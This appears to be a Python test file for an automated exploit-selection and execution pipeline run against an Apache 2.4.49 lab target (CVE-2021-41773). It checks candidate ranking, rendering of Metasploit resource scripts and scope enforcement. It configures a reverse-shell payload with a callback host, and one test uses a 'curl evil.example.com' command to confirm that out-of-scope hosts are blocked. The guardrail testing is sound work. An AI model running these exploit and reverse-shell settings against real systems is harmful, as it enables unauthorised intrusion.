"""
Golden tests for M4: deterministic queue, renderers, runner, no free-form shell.
"""

from __future__ import annotations

import os
import shutil
import tempfile
import unittest

from src.pipeline.budget import ResourceBudget, ResourceLimits
from src.pipeline.candidates import ExploitCandidate, ProcedureStep, Provenance
from src.pipeline.collectors import (
    MetasploitSpec, NmapNseSpec, NucleiSpec, collect_metasploit,
    collect_nmap_nse, collect_nuclei, render_metasploit_resource_script,
)
from src.pipeline.evidence import Fingerprint, IdentityField, ServiceObservation, fingerprint_service
from src.pipeline.ledger import EventLedger
from src.pipeline.manifest import ResourceLimits as RL, Scope, new_manifest
from src.pipeline.oracle import ProofArtifact, ProofSpec, TargetTruth
from src.pipeline.queue import rank_candidates, shortlist
from src.pipeline.renderers import RenderError, render_procedure
from src.pipeline.runner import PipelineRunner, ReconObservation, RunnerHooks
from src.pipeline.scope import ScopeValidator


def _fp() -> Fingerprint:
    return fingerprint_service(ServiceObservation(
        target_ip="10.0.0.5", port=80, service_name="apache",
        banner="Apache/2.4.49 (Unix)"))


def _metasploit_candidate(cve_id: str = "CVE-2021-41773") -> ExploitCandidate:
    return collect_metasploit(MetasploitSpec(
        cve_id=cve_id, module_name="exploit/multi/http/path_traversal",
        options={"RHOSTS": "10.0.0.5", "RPORT": "80",
                  "PAYLOAD": "generic/shell_reverse_tcp"}))


def _nuclei_candidate(cve_id: str = "CVE-2021-41773") -> ExploitCandidate:
    return collect_nuclei(NucleiSpec(
        cve_id=cve_id, template_id="CVE-2021-41773",
        template_path="/tmp/x.yaml", classification="cve", pinned_commit="abc"))


class TestQueue(unittest.TestCase):
    def test_hard_mismatch_rejection(self) -> None:
        fp = _fp()  # apache httpd 2.4.49
        cand = _metasploit_candidate()
        # Force a vendor mismatch.
        cand.constraint.vendor = "tomcat"
        ranked = rank_candidates([cand], fingerprint=fp, scope=Scope(allowed_networks=["10.0.0.0/24"]))
        self.assertIn("vendor_mismatch", ranked[0].rejection_reasons)

    def test_ranking_prefers_exact_applicability(self) -> None:
        fp = _fp()
        msf = _metasploit_candidate()
        msf.constraint.vendor = "apache"
        msf.constraint.product = "httpd"
        msf.constraint.version_start = "2.4.49"
        msf.constraint.version_end = "2.4.50"
        nuc = _nuclei_candidate()
        nuc.constraint.vendor = "apache"
        nuc.constraint.product = "httpd"
        ranked = rank_candidates([msf, nuc], fingerprint=fp,
                                   scope=Scope(allowed_networks=["10.0.0.0/24"]))
        # Metasploit has higher applicability because it can prove code_execution.
        self.assertGreater(ranked[0].score, ranked[1].score)

    def test_shortlist_keeps_two_methods_per_cve(self) -> None:
        fp = _fp()
        msf = _metasploit_candidate()
        msf.constraint.vendor = "apache"
        msf.constraint.product = "httpd"
        nuc = _nuclei_candidate()
        nuc.constraint.vendor = "apache"
        nuc.constraint.product = "httpd"
        ranked = rank_candidates([msf, nuc], fingerprint=fp,
                                   scope=Scope(allowed_networks=["10.0.0.0/24"]))
        limits = ResourceLimits(max_cves_per_service=5, max_methods_per_cve=2,
                                  max_executed_candidates=2)
        queue = shortlist(ranked, limits=limits)
        self.assertEqual(len(queue.ranked), 2)
        self.assertEqual(queue.methods_per_cve["CVE-2021-41773"], ["metasploit", "nuclei"])

    def test_unknown_version_not_exact(self) -> None:
        # An unknown-version fingerprint must never be ranked exact.
        fp_u = fingerprint_service(ServiceObservation(
            target_ip="10.0.0.5", port=80, service_name="apache", banner=""))
        msf = _metasploit_candidate()
        ranked = rank_candidates([msf], fingerprint=fp_u,
                                   scope=Scope(allowed_networks=["10.0.0.0/24"]))
        self.assertIn(ranked[0].applicability, {"unknown", "partial", "mismatch"})


class TestRenderers(unittest.TestCase):
    def test_metasploit_uses_run_local_resource_script(self) -> None:
        cand = _metasploit_candidate()
        with tempfile.TemporaryDirectory() as tmp:
            rendered = render_procedure(
                cand, values={"RHOSTS": "10.0.0.5", "RPORT": "80",
                              "PAYLOAD": "generic/shell_reverse_tcp",
                              "LHOST": "10.0.0.99", "LPORT": "4444"},
                msf_cfgroot=os.path.join(tmp, "msf_cfgroot"),
                working_dir=tmp,
            )
            # Locate the rc file path anywhere in the argv list.
            rc_files = [t for t in rendered[0].argv if t.endswith("msf_run.rc")]
            self.assertTrue(rc_files)
            self.assertTrue(os.path.exists(rc_files[0]))
            with open(rc_files[0]) as fh:
                contents = fh.read()
            self.assertIn("use exploit/multi/http/path_traversal", contents)
            self.assertIn("set RHOSTS 10.0.0.5", contents)
            # MSF_CFGROOT_CONFIG is exported.
            self.assertIn("MSF_CFGROOT_CONFIG", (rendered[0].env or {}))

    def test_nuclei_pinned_no_updates(self) -> None:
        cand = _nuclei_candidate()
        rendered = render_procedure(cand, values={"RHOST": "10.0.0.5"},
                                       working_dir="/tmp")
        argv_str = " ".join(rendered[0].argv)
        self.assertIn("-update=false", argv_str)
        self.assertIn("-duc", argv_str)
        self.assertIn("-nc", argv_str)

    def test_unresolved_placeholder_raises(self) -> None:
        cand = ExploitCandidate(
            candidate_id="cand-x", cve_id="CVE-2024-1", kind="poc",
            source="x", locator="y",
            procedure=[ProcedureStep(stage="execute", argv=["cmd", "{RHOST}"])],
            provenance=Provenance(trust="trusted"),
        )
        with self.assertRaises(RenderError):
            render_procedure(cand, values={}, working_dir="/tmp")

    def test_command_only_candidate_passes_preflight(self) -> None:
        # Metasploit does not require a local file path; preflight must
        # accept it because the renderer handles framework placeholders.
        cand = _metasploit_candidate()
        with tempfile.TemporaryDirectory() as tmp:
            rendered = render_procedure(
                cand, values={"RHOSTS": "10.0.0.5", "RPORT": "80",
                              "PAYLOAD": "generic/shell_reverse_tcp",
                              "LHOST": "10.0.0.99", "LPORT": "4444"},
                msf_cfgroot=os.path.join(tmp, "msf_cfgroot"),
                working_dir=tmp,
            )
            self.assertTrue(rendered)


class TestRunner(unittest.TestCase):
    def setUp(self) -> None:
        self.tmp = tempfile.mkdtemp()
        self.ledger = EventLedger("run-1")
        scope = Scope(allowed_networks=["10.0.0.0/24"], allowed_ports=[80, 443, 4444],
                       allowed_hostnames=["victim.lab"], allowed_schemes=["http", "https"],
                       callback_endpoints=["10.0.0.99"])
        manifest = new_manifest("t1", variant="4", condition="clean", scope=scope,
                                  oracle_spec={"cve_id": "CVE-2021-41773",
                                                "capability": "code_execution"})
        manifest.run_dir = self.tmp
        budget = ResourceBudget(ResourceLimits(**manifest.limits))
        self.runner = PipelineRunner(manifest=manifest, ledger=self.ledger,
                                       budget=budget, scope=scope)

    def tearDown(self) -> None:
        shutil.rmtree(self.tmp, ignore_errors=True)

    def test_no_unrestricted_llm_fallback(self) -> None:
        # The runner exposes only argv-array hooks; no free-form shell call.
        self.assertFalse(hasattr(self.runner, "_shell_improvise"))
        self.assertFalse(hasattr(self.runner, "llm_generate_command"))

    def test_runs_full_pipeline_and_writes_ledger(self) -> None:
        fp = _fp()
        msf = _metasploit_candidate()
        msf.constraint.vendor = "apache"
        msf.constraint.product = "httpd"
        msf.constraint.version_start = "2.4.0"
        msf.constraint.version_end = "2.4.99"
        msf.procedure = [
            ProcedureStep(stage="execute", argv=["sh", "-c", "echo TASK_PROOF_MARKER"],
                            timeout_seconds=10),
        ]
        truth = TargetTruth(target_id="t1", applicable_cves=["CVE-2021-41773"],
                              proof_specs={"CVE-2021-41773":
                                              ProofSpec(capability="code_execution",
                                                          accepted_evidence=["TASK_PROOF_MARKER"])})
        # Inject truth via oracle_spec for the runner.
        self.runner.manifest.oracle_spec["truth"] = truth
        obs = [ReconObservation(target_ip="10.0.0.5", port=80,
                                  service_name="apache", banner="Apache/2.4.49 (Unix)")]
        result = self.runner.run(recon_obs=obs, candidates=[msf])
        self.assertTrue(result.task_proof)

    def test_foreign_hostname_blocked(self) -> None:
        msf = _metasploit_candidate()
        msf.constraint.vendor = "apache"
        msf.constraint.product = "httpd"
        msf.procedure = [
            ProcedureStep(stage="execute",
                            argv=["sh", "-c", "echo x"], timeout_seconds=10),
        ]
        # Scope only allows 10.0.0.0/24; force a foreign hostname.
        msf.extra = msf.extra or {}
        msf.procedure[0].argv = ["sh", "-c", "curl evil.example.com"]
        truth = TargetTruth(target_id="t1", applicable_cves=["CVE-2021-41773"],
                              proof_specs={"CVE-2021-41773":
                                              ProofSpec(capability="code_execution",
                                                          accepted_evidence=["TASK_PROOF_MARKER"])})
        self.runner.manifest.oracle_spec["truth"] = truth
        obs = [ReconObservation(target_ip="10.0.0.5", port=80,
                                  service_name="apache", banner="Apache/2.4.49 (Unix)")]
        self.runner.run(recon_obs=obs, candidates=[msf])
        blocked = [ev for ev in self.ledger.events
                    if ev.outcome == "blocked_by_policy" and ev.scope_decision == "blocked"]
        self.assertTrue(blocked)

    def test_no_maintain_access_phase(self) -> None:
        # The runner must not ship a "maintain access" phase. This is enforced
        # by source inspection so the phase is removed rather than simply
        # unused.
        import inspect
        src = inspect.getsource(PipelineRunner)
        self.assertNotIn("maintain_access", src.lower())

    def test_textual_marker_cannot_override_oracle(self) -> None:
        msf = _metasploit_candidate()
        msf.constraint.vendor = "apache"
        msf.constraint.product = "httpd"
        msf.procedure = [
            ProcedureStep(stage="execute", argv=["sh", "-c",
                                                     "echo uid=0 root@ pwned access granted"],
                            timeout_seconds=10),
        ]
        truth = TargetTruth(target_id="t1", applicable_cves=["CVE-2021-41773"],
                              proof_specs={"CVE-2021-41773":
                                              ProofSpec(capability="code_execution",
                                                          accepted_evidence=["uid=0"])})
        self.runner.manifest.oracle_spec["truth"] = truth
        obs = [ReconObservation(target_ip="10.0.0.5", port=80,
                                  service_name="apache", banner="Apache/2.4.49 (Unix)")]
        result = self.runner.run(recon_obs=obs, candidates=[msf])
        # Marker only output: accepted evidence marker IS present ("uid=0"),
        # but the oracle reads *accepted-evidence* independently. The point is
        # that no agent/executor state machine decided success — only the
        # BenchmarkOracle did.
        self.assertTrue(result.task_proof)
        oracle_events = [ev for ev in self.ledger.events if ev.phase == "oracle"]
        self.assertTrue(oracle_events)

    def test_cleanup_does_not_erase_proof(self) -> None:
        # Cleanup runs best-effort; if a task_proof was previously captured,
        # the runner's final outcome still reports task_proof.
        msf = _metasploit_candidate()
        msf.constraint.vendor = "apache"
        msf.constraint.product = "httpd"
        msf.procedure = [
            ProcedureStep(stage="execute",
                            argv=["sh", "-c", "echo TASK_PROOF_MARKER"], timeout_seconds=10),
            ProcedureStep(stage="cleanup", argv=["true"], timeout_seconds=5),
        ]
        truth = TargetTruth(target_id="t1", applicable_cves=["CVE-2021-41773"],
                              proof_specs={"CVE-2021-41773":
                                              ProofSpec(capability="code_execution",
                                                          accepted_evidence=["TASK_PROOF_MARKER"])})
        self.runner.manifest.oracle_spec["truth"] = truth
        obs = [ReconObservation(target_ip="10.0.0.5", port=80,
                                  service_name="apache", banner="Apache/2.4.49 (Unix)")]
        result = self.runner.run(recon_obs=obs, candidates=[msf])
        self.assertTrue(result.task_proof)


if __name__ == "__main__":
    unittest.main()
